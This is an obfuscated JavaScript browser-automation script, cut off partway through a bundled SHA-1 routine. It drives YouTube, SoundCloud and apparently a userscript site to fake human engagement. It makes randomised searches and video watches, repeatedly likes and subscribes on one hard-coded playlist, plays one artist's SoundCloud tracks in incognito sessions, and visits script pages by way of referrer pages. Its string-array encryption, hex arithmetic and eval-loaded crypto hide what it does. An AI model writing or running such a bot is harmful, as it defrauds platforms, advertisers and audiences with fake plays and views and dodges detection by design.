function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1f1b + -0xf96 + 0x2eb1);
    let h = e[f];
    if (b['ZUeaYs'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x322 + -0x93 * -0xe + 0x596 * -0x2, s, t, u = 0x1f3 * 0xb + 0x1 * -0x208b + 0xb1a; t = n['charAt'](u++); ~t && (s = r % (0x1 * -0xe81 + -0x2 * 0x135b + 0x1 * 0x353b) ? s * (-0xf40 + -0x606 * -0x1 + 0x4bd * 0x2) + t : t, r++ % (0x1d * -0x6d + -0x211 * 0x8 + 0xd * 0x239)) ? p += String['fromCharCode'](-0x2023 + 0x23f6 + -0x2d4 & s >> (-(-0x2449 + -0xfb * 0x10 + 0x33fb) * r & -0x2102 + -0xac * 0x35 + 0x2e * 0x17e)) : 0x1fbb + 0x3 * -0x208 + 0x19a3 * -0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x25ff + -0x1729 + -0xed6, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x245a + -0x26 * 0xbe + 0x409e))['slice'](-(0x2677 + 0x371 + 0x1f * -0x15a));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x12c9 + 0x150 + -0x7 * -0x27f,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xa7f + -0x1eac + -0x5 * -0x409; u < -0x20ea + -0x1 * -0xbb7 + 0x1633; u++) {
          p[u] = u;
        }
        for (u = -0x111c + -0x1 * -0x65c + 0xac0 * 0x1; u < -0x9dd * 0x1 + -0x1 * -0x2612 + 0x5 * -0x571; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x268f + -0x1266 + 0x3 * -0x663), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x102d + -0x15b * 0x4 + -0xac1, q = 0x2403 + 0x10b4 + -0x34b7;
        for (let v = -0x5cb + 0x459 + 0x2 * 0xb9; v < n['length']; v++) {
          u = (u + (-0x1 * 0x13a3 + 0x1 * -0x203f + 0x33e3)) % (-0x29 * -0x1d + 0x1 * -0x2d4 + 0x1 * -0xd1), q = (q + p[u]) % (-0x24c + -0x509 * -0x2 + -0x242 * 0x3), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0xc5f + 0x19 * -0x43 + -0x4d4 * 0x1)]);
        }
        return t;
      };
      b['AXtSnh'] = m, c = arguments, b['ZUeaYs'] = !![];
    }
    const j = e[-0x1d1c + 0x1c3e + 0x2 * 0x6f],
      k = f + j,
      l = c[k];
    return !l ? (b['wsSHYH'] === undefined && (b['wsSHYH'] = !![]), h = b['AXtSnh'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const X = c,
  W = d,
  V = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x512 + 0x1 * -0xe81 + -0x4 * -0x4e5))) + i;
}

function a() {
  const bo = [
    'isMoomooIo',
    'zwfZEwzVCMSUBW',
    'WPKWw8ojW6fWWO00W7pdIa',
    'z8k+ASkQlmonWPrkoGy',
    'zw51C2vYANmUBW',
    'W6BdTqqqDxDUWOe4WRa',
    'C8o/FCk2lColWPrlk0C',
    'WRPIp8kQWR3cO8kAW6iaWPW',
    'y2XVC2u',
    'WPe1bCkkWRxdSHVcQCkbWR4',
    'zs8Q',
    'lZeWoc4WlJaUma',
    'ses,moomoo',
    'click',
    'rActionLay',
    'Fa3dLSkkWQvafh3cUSkd',
    'easyfork.o',
    'DhmGCM0SyNrZia',
    'Ahr0Chm6lY9NCG',
    'zsXTB29TB28UAq',
    'ChrZlZqYndy1nq',
    'B2fYzcz1Dg1FBq',
    't,minecraf',
    'wqodlkwjqn',
    'W55fW5ldTLXE',
    '/Bloggerpe',
    'zgL1Bs5JB20Vqa'
  ];
  a = function() {
    return bo;
  };
  return a();
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x6c9 + -0xd57 * -0x1 + -0xa10 * 0x2), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  const R = b;
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + R(0x18, 'IiS0')],
    'timeout': 0x0
  }), i ? await wait(0x9dd4 + 0x7eee + 0x59 * -0x1e2 + (0x10 * 0x751 + -0x54fe + -0x46 * -0x61) * random()) : await standardWaitForNetIdle(f), await wait(-0xf38 + -0x1cb6 + 0x3f76 + (0x1ce + -0x2cd7 + 0x5219) * random()), -0x15bd + 0x1 * 0x2149 + -0x3 * 0x3d9;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xd * -0x2c + 0x21ee * 0x1 + -0xc2a), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1e4a + -0x2444 + 0x428f;
}
async function randomWait() {
  return await wait(-0x2264 + 0x2444 + 0x2 * 0x8d4 + (0x11 * -0x13a + -0x2379 + -0x4bdb * -0x1) * random()), -0x967 + -0x2e * -0x1 + 0x93a;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x6ea + 0x10c8 + -0x34a * 0x3, 0xb5d + -0xbe + -0xe2 * 0xc), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x17a21 * 0x1 + -0xde6 + 0x81db * -0x1) * getRandomInt(-0x2639 + 0x6 * 0x300 + -0x1 * -0x143b, 0x1 * -0x247b + -0x1 * 0x661 + 0x2ae1), h)), 0x5b9 + 0x15 * -0x119 + 0x1155;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xa9f + -0x4 * 0xb2 + 0xd67;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x135f + 0x6e9 + -0x1 * 0x1a47]['split']('\x20');
    for (let k = 0x57b + -0x1 * -0x1b5 + -0x2e * 0x28; k < i['length']; k += 0x1 * 0x1d9f + 0xfb + -0x2c8 * 0xb)
      j += i[k] * h[i[k + (-0x7c1 * -0x4 + -0x4 * 0x5df + -0x29 * 0x2f)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x116b * -0x1 + 0xec5 + -0x1015 * 0x2)['map'](l => Array['from'](l['children']))['flat'](0xaee * -0x3 + 0x1116 + -0xfb5 * -0x1)['map'](l => l['childNodes'][0x3 * -0x65b + 0x1123 + 0x1ef * 0x1]['childNodes'][0x38 * 0x6b + -0x1cb9 * -0x1 + 0x5 * -0xa6d]['childNodes'][-0xd7 * 0x1f + 0x494 + -0x1576 * -0x1]['childNodes'][0x6ac + -0x16c8 + 0x80e * 0x2]['childNodes'][-0x1faf + -0x1b36 + 0x3ae6]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xa54 + -0x1127 * 0x1 + 0xabb, -0xc2f + -0x5f2 + 0x25a9 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x6dea + -0x8 * 0x536 + 0xd232);
  const h = await getMaxTime(f),
    i = Math['min']((-0x11637 + 0x3 * -0x828b + 0x38838) * getRandomInt(0x11ee + -0xf3f + -0x5 * 0x89, -0x1 * -0x1dd + 0x8a7 * -0x1 + 0x6cf), h);
  return await wait(i), 0x1117 + -0x479 + 0xc9d * -0x1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1929 + -0xe5a + 0x2783]['children'][0xeb * -0x17 + -0x182e + 0x2d4b]['children'][-0x1a91 + -0x1630 + -0x7 * -0x6f7]['children'][-0xc53 + 0x3 * -0xb51 + -0x1723 * -0x2]['children'][-0x1355 + 0x8a * 0x36 + -0x9c7 * 0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x3 * -0x323 + 0xf60 + -0x1 * 0x5f6;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1f1b + -0xf96 + 0x2eb1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x26da * -0x1 + -0x9 * -0x289 + -0x1 * 0x3d47 + (-0x1 * -0x1c14 + -0x13f5 + -0x7ed) * random()
  }), await wait(-0x2 * 0x3be + -0x11e7 + -0x1 * -0x1b57 + (0x7 * 0x52f + 0x12d1 * 0x2 + -0x48bf) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x5a3 + -0x1 * 0x7be + 0x1 * 0x21d]['childNodes'][-0x3 * -0x705 + -0x3 * -0x4f9 + 0x1 * -0x23f9]['childNodes'][-0x9e9 + -0x136c + 0x2ef * 0xa]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0xad3 + -0x1 * -0x1701 + 0xf * -0x241]['childNodes'][-0xf7c + 0x123 * 0x11 + 0x1 * -0x3d7]['childNodes'][-0x66e + -0x1598 + 0x1c08]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xda1 + 0x9ad * 0x1 + -0x5 * 0x4a9),
          r = -0xcf9 + -0x26f6 * 0x1 + 0x5 * 0xa63;
        for (let u = 0x6e9 * -0x3 + 0x329 * -0x5 + 0x14e * 0x1c; u < q['length']; u += 0x191c + -0x408 * -0x2 + -0x212a)
          r += q[u] * k[q[u + (0x93d + -0x995 + 0x59)]];
        return r;
      }(n);
  });
  await wait((0x1 * -0x24cd + 0x9 * 0x663 + 0x17 * 0x1a6) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1bfc5 + -0x4828 + -0x8d3d) * getRandomInt(-0x9d * 0x19 + 0x129e + -0x348, -0x108b + 0x1073 * 0x1 + -0x11 * -0x2), h + (-0xf25 * -0x1 + -0x17d1 + 0x4 * 0x70d));
  return await wait(i), -0x15 * 0x1d1 + 0x2 * -0x173 + 0x290c;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1e7e * -0x1 + 0x853 * -0x1 + 0x20b * 0x13), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xde7 + -0x163a + 0x551 * 0x9 + (-0x1849 * -0x1 + -0x1f89 + 0xa8 * 0x11) * Math['random']());
    });
  }, 0xd1 * 0x2b + -0x2 * 0x17f7 + 0x282b);
  await wait(-0x9 * -0x1ca + -0x5e7d0 + 0xa6b96);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x935 * 0x21 + 0x18f5c + -0x1d4d1) * getRandomInt(0x234 * 0x3 + -0x23ea * -0x1 + -0x2a82, 0x9fa * 0x1 + -0x114d * -0x2 + 0x1 * -0x2c7b)), clearInterval(h), 0x6a5 * -0x2 + -0x1 * 0x1161 + 0x34 * 0x97;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x244a + -0x1888 + -0xbc2;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * -0x210e + 0x247e + -0x458b;
    await randomWait();
  }
  return -0xe5e + -0x19dc + 0x283b * 0x1;
}

function fetchRandomSC() {
  const S = c;
  return Math['random']() <= -0x22da + 0x19f3 + 0x8e7 * 0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + S(0x15) + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x8fa + -0x188f + 0x2189 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1699 + 0x1 * -0xd51 + -0x21 * 0x48 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x152e + -0x1 * 0xc9 + -0x1465;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xb3c + 0x1276e + -0x1 * 0x6c6a + getRandomInt(0x11 * 0x463 + 0x4411 + 0x3 * -0x1c04, 0x3b2b + 0x84d0 + -0x4acb));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1f3d * -0x1 + -0x76 * -0xd + -0x8 * -0x328), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x49d + 0x1 * -0x138f + 0xef2;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x863 + 0x1a4c + -0x5 * 0x395, 0xac8 + 0x1 * 0x4f0 + -0xf86)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x2379 + -0x1 * 0x111a + -0x3 * -0x1421 + floor((-0xde5 * 0x1 + 0x11ef + -0x22) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3bc * -0x2113ca + -0x225121 * 0x542 + -0x3 * -0x3da2e30e),
          0x60f264 + -0x1 * 0x1f6c6a + 0x3e7a06,
          -0xe8db + -0x2fff * -0x2 + 0x163 * 0xbf,
          0x5a3 * -0x1 + 0xb * -0x1b6 + 0x18f5 * 0x1
        ], y = [
          0x1a58 + 0x3e * 0x78 + 0x78 * -0x76,
          -0x1 * 0xfcd + -0x241f + 0x1154 * 0x3,
          0x19e4 + -0x2ab * 0x2 + -0x1486,
          -0x120a * -0x2 + 0x18b0 + -0x3cc4
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1 * -0x4bc + 0x1 * 0xfa7 + -0xaea)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x240c + 0x978 + -0x2d84; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const T = b;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N[T(0x3, '5YeN') + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1138 + -0x662 + -0x6 * -0x3ef) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x12ff * -0x1 + -0x26 * -0x29 + -0x1 * 0x1915] = A[0x109d * 0x2 + -0x2376 + 0x6 * 0x62] = A[-0x15cc + -0x3 * 0x51b + -0x128f * -0x2] = A[0x16 * -0xf5 + -0x1 * 0x1ce5 + 0x31f5] = A[0x2554 + 0x218 * -0xd + -0xb * 0xeb] = A[-0x1a9d + 0xa8 + 0x1 * 0x19f9] = A[-0x18d1 * -0x1 + 0x25e5 + -0xb * 0x5b3] = A[0xe * -0x2c8 + -0x118a * -0x1 + 0x156c] = A[-0x1409 + 0x2217 * 0x1 + -0xe07] = A[0x167a + 0x1cbf * -0x1 + -0x1 * -0x64d] = A[-0x1aab + 0x479 + 0x3 * 0x769] = A[0xab5 * -0x1 + -0x2146 * 0x1 + -0xbf * -0x3b] = A[0x7c0 + -0x122f + 0xa7a] = A[0x1a0c + 0x3b * -0x1e + -0x1316] = A[0xe97 + -0xd5e + -0x12c] = A[0x1d6e + 0x823 * 0x4 + -0x3dec] = A[-0x99e + -0x26d2 * -0x1 + -0x1d25] = -0x44c + 0x12d1 * -0x2 + 0x29ee, this['blocks'] = A) : this['blocks'] = [
                0x2310 + 0xa3 * -0x2b + 0x7 * -0x119,
                -0x1daf + 0x1 * 0xb97 + -0xc * -0x182,
                0x1 * -0x1e95 + -0x1008 + 0x2e9d,
                0x2182 + 0x9f6 + -0x2b78,
                0xc40 + 0xc35 + -0x3 * 0x827,
                0x11cf * 0x1 + 0x490 + -0x165f,
                0xea * -0x17 + 0x2e3 + 0x1223,
                0x1 * 0x1d5f + -0x1b8a + -0x1d5,
                0xae * 0x16 + -0x7b * -0x2f + -0x2589,
                -0x1b0b + -0x1d8e + 0x3899,
                0x47 * 0x43 + -0x5cb + -0xcca,
                -0x72 * -0x2f + -0x52 * 0x1f + -0xb00,
                0x970 * -0x4 + 0x7 * -0x2b9 + 0x38cf,
                -0x1 * 0x541 + 0x116a + -0xc29,
                -0x1e0e * -0x1 + 0x1 * -0x167c + -0x66 * 0x13,
                0x10e1 + 0x251b + -0x35fc,
                -0xcf5 + 0x24dc + 0x17e7 * -0x1
              ], this['h0'] = -0x9d * -0xa47296 + 0x204df21 * 0x59 + -0xb146b576, this['h1'] = -0x13106c72c + -0xdb6 * 0xd0e8f + 0x2d3da0f5f, this['h2'] = -0x1026fcff + 0x1 * 0x117e85c97 + -0x6f06829a, this['h3'] = 0x80e472b + 0x3e02 * 0x60b3 + -0x53 * 0x2f2219, this['h4'] = -0x13c8ed407 + -0x71ac4352 * 0x2 + 0x2e3ba3c9b * 0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x5a * 0x35 + 0x1 * 0x425 + -0x157 * 0x11, this['finalized'] = this['hashed'] = -0x3f3 * -0x1 + 0x16 * 0x189 + -0x25b9, this['first'] = -0x421 * -0x7 + -0x20ef + -0x1 * -0x409;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xbc3 + 0x1 * 0xe75 + -0x2b2, O = J['length'] || 0x1902 + 0x111c + -0x2a1e, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x1 * 0x1f37 + -0x2ca + -0x6cd * -0x5, P[0x163c + -0x22d0 * 0x1 + 0xc94] = this['block'], P[0x19cc + -0x1474 + -0x2 * 0x2a4] = P[0x153 + -0x1 * 0x31d + 0x1cb] = P[0x1d28 + -0x2ef * -0x3 + -0x25f3] = P[0x1756 * -0x1 + 0x171 + 0x15e8] = P[0x1 * 0x1c36 + -0x1731 + 0x1 * -0x501] = P[0x2 * 0xc77 + 0x1d27 + -0x3610] = P[-0x252e * 0x1 + -0x4 * -0x45 + 0x2420] = P[0xab8 + -0x466 * 0x6 + 0xfb3] = P[0x170b * -0x1 + 0x1f1c + -0x1 * 0x809] = P[0x24ca + 0x314 * 0x1 + 0x3 * -0xd47] = P[-0x1018 + 0x1500 + -0x4de] = P[0x682 * -0x1 + -0x1623 + 0x1cb0] = P[0x6b * -0x3a + -0x645 + -0x1e8f * -0x1] = P[-0x18a * -0x5 + -0x113d + 0x4cc * 0x2] = P[0x27 + 0x437 * -0x1 + 0x41e] = P[0x1817 * 0x1 + 0x11 * -0x235 + -0x1 * -0xd7d] = -0x5cf * 0x1 + -0x132c + 0x18fb * 0x1), K) {
                    for (N = this['start']; M < O && N < -0x288 * -0x2 + -0x177f + 0x12af; ++M)
                      P[N >> 0x355 * 0x5 + 0x2 * -0x6e6 + 0x2db * -0x1] |= J[M] << y[0x2a5 * -0x2 + 0x1 * 0x1433 + -0xee6 * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0xe34 + -0x14ab + 0x6b7; ++M)
                      (L = J['charCodeAt'](M)) < -0x10f6 + 0x2138 + -0x7e1 * 0x2 ? P[N >> -0xab9 + 0x1d9b + -0x12e0] |= L << y[0x133d + 0x23b1 + -0x36eb & N++] : L < -0x2 * 0x30d + 0x1635 + 0x1 * -0x81b ? (P[N >> 0x1d48 + 0xd27 + -0x2a6d * 0x1] |= (-0x1bda + -0x1f41 + 0x3bdb | L >> -0x4df * 0x1 + 0x7b8 * -0x1 + -0xc9d * -0x1) << y[0x10 * 0x1a6 + -0x8d * 0x22 + -0x7a3 & N++], P[N >> 0x1 * -0x134f + 0x2 * 0x6c5 + -0x33 * -0x1d] |= (-0x2 * -0x7b5 + -0x2682 + 0x97 * 0x28 | 0x10a6 * 0x1 + 0x146b + 0x2 * -0x1269 & L) << y[-0x1e28 + 0x1050 + 0xddb & N++]) : L < 0xe89 * 0x8 + -0x18894 + -0x4 * -0x7b13 || L >= 0x133a1 + -0x1 * -0x144f9 + -0x2 * 0xcc4d ? (P[N >> 0x2127 + -0xcaa + -0x7 * 0x2ed] |= (-0x4c * 0x58 + -0x3 * -0x97 + 0x3 * 0x869 | L >> 0x4c3 + 0x1c * -0xb3 + -0x5 * -0x2f9) << y[-0x865 + 0x1dd3 + -0x156b & N++], P[N >> -0xde * 0x1 + 0x1 * -0x1feb + -0x5 * -0x68f] |= (-0x15f2 + 0x23f1 + -0xd7f | L >> -0x2571 + 0xc3b * 0x1 + -0xaa * -0x26 & 0x64c + 0x19a3 + -0x68 * 0x4e) << y[-0x5e8 + -0xa4 + 0x68f & N++], P[N >> -0x69f + -0x2663 + -0x2b * -0x10c] |= (-0x853 * -0x4 + -0x35 * -0x28 + -0x2914 | -0x5 * 0x541 + -0xae + -0x1b32 * -0x1 & L) << y[0x155e + -0x14b4 + -0xa7 * 0x1 & N++]) : (L = -0xefd2 + -0x9c94 + 0x28c66 * 0x1 + ((-0x52d * 0x3 + 0x12ac + -0xda * -0x1 & L) << -0x2b9 + -0x11 * -0xd5 + -0x2f * 0x3e | -0x29e + -0x400 * -0x4 + -0x963 * 0x1 & J['charCodeAt'](++M)), P[N >> -0x1002 + -0x7 * -0x39a + 0x1 * -0x932] |= (0x22ba + 0x859 * -0x1 + -0x1 * 0x1971 | L >> -0x26a6 + -0x5fe + 0x2cb6) << y[-0x21b * 0xd + -0x2 * -0xb73 + 0xe * 0x52 & N++], P[N >> -0x11 * -0x91 + 0x7ea + 0x1189 * -0x1] |= (-0x12 * -0xe + 0x2a2 * 0x4 + -0x1 * 0xb04 | L >> -0xb77 + -0x7f * -0x1 + 0x5e * 0x1e & -0x3 * -0x44e + 0x1f8e + -0x2c39) << y[-0xe02 * 0x2 + 0x1cb9 + -0xb2 & N++], P[N >> -0xcc4 + -0x1be4 + -0x15b * -0x1e] |= (-0x29 * 0xa3 + 0x261 + 0x1bb * 0xe | L >> 0x24b * 0xb + -0x1ee6 + 0x5b3 & 0x8c5 + -0x22b * -0xc + -0x228a) << y[0x1c21 * 0x1 + -0x1c0f + -0xf & N++], P[N >> 0x5 * 0x3d + -0x1935 + 0x1806] |= (0x2 * -0x405 + 0x16b7 * 0x1 + 0x13 * -0xbf | 0x2625 + -0x4f1 + 0x8f * -0x3b & L) << y[-0x1ad3 + -0x73a * -0x3 + 0x528 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1 * -0x575 + 0x1 * -0x14c6 + 0x1 * 0xf91 ? (this['block'] = P[0x2 * 0x977 + 0xe * -0xf5 + 0x5 * -0x118], this['start'] = N - (-0x75a * -0x2 + 0x3f9 + 0x1 * -0x126d), this['hash'](), this['hashed'] = -0x2496 + -0x1cba + 0x4151) : this['start'] = N;
                }
